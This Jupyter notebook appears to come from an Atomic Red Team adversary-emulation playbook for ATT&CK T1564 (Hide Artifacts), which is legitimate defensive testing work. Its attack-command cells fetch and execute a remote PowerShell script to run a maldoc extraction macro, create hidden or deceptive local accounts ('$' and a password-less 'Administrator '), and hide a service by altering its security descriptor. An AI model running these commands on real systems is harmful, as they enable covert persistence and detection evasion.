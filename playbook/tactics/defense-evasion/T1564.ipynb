{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "4219e070",
   "metadata": {},
   "source": "# T1564 - Hide Artifacts\nAdversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)\n\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)"
  },
  {
   "cell_type": "markdown",
   "id": "61833ff0",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "ae807967",
   "metadata": {},
   "source": "### Atomic Test #1 - Extract binary files via VBA\nThis module extracts a binary (calc.exe) from inside of another binary. \n\nIn the wild maldoc authors will use this technique to hide binaries inside of files stored \nwithin the office document itself. An example of this technique can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\nThis sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2\nis the same document without all the malicious code. Document 1 will copy Document 2 to the file system\nand then \"peek\" inside of this document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin file is a payload that is parsed out and executed on the file system.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Microsoft Word must be installed\n\n##### Check Prereq Commands:\n```powershell\ntry {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1ad1be46",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "71908009",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$macro = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1564\\src\\T1564-macrocode.txt\")\n$macro = $macro -replace \"aREPLACEMEa\", \"PathToAtomicsFolder\\T1564\\bin\\extractme.bin\"\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroCode \"$macro\" -officeProduct \"Word\" -sub \"Extract\" -NoWrap\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c257f9b0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "f0cf2ee0",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item \"$env:TEMP\\extracted.exe\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "84eeeae8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "611e3116",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Create a Hidden User Called \"$\"",
    "Creating a user with a username containing \"$\"",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet user $ ATOMIC123! /add /active:yes```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c4c00c03",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "818931ff",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nnet user $ /DELETE 2>&1```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5525bb2c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "2ef91350",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Create an \"Administrator \" user (with a space on the end)",
    "Creating a user with a username containing with a space on the end",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-LocalUser -Name \"Administrator \" -NoPassword```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "583f8606",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "764e2ada",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-LocalUser -Name \"Administrator \" 2>&1 | out-null```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b76d1ee7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "92c3f848",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Create and Hide a Service with sc.exe",
    "The following technique utilizes sc.exe and sdset to change the security descriptor of a service and \"hide\" it from Get-Service or sc query.\n\nUpon successful execution, sc.exe creates a new service changes the security descriptor.\n\nhttps://twitter.com/Alh4zr3d/status/1580925761996828672\nhttps://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nsc.exe create AtomicService binPath= \"C:\\Windows\\System32\\calc.exe\"\nsc sdset AtomicService \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "07f6664b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "26bccefa",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nsc.exe delete AtomicService\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e1927e36",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e1ababaa",
   "metadata": {},
   "source": "## Detection\nMonitor files, processes, and command-line arguments for actions indicative of hidden artifacts. Monitor event and authentication logs for records of hidden artifacts being used. Monitor the file system and shell commands for hidden attribute usage."
  },
  {
   "cell_type": "markdown",
   "id": "306fb82e",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Software Manipulation \n Make changes to a system's software properties and functions to achieve a desired effect. \n\n Software Manipulation allows a defender to alter or replace elements of the operating system, file system, or any other software installed and executed on a system.\n#### Opportunity\nThere is an opportunity to block an adversary's intended action and force them to reveal additional TTPs.\n#### Use Case\nA defender can manipulate commands on system so that an adversary is unable to hide artifacts in ways they normally would.\n#### Procedures\nHook the Win32 Sleep() function so that it always performs a Sleep(1) instead of the intended duration. This can increase the speed at which dynamic analysis can be performed when a normal malicious file sleeps for long periods before attempting additional capabilities.\nHook the Win32 NetUserChangePassword() and modify it such that the new password is different from the one provided. The data passed into the function is encrypted along with the modified new password, then logged so a defender can get alerted about the change as well as decrypt the new password for use.\nAlter the output of an adversary's profiling commands to make newly-built systems look like the operating system was installed months earlier.\nAlter the output of adversary recon commands to not show important assets, such as a file server containing sensitive data.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}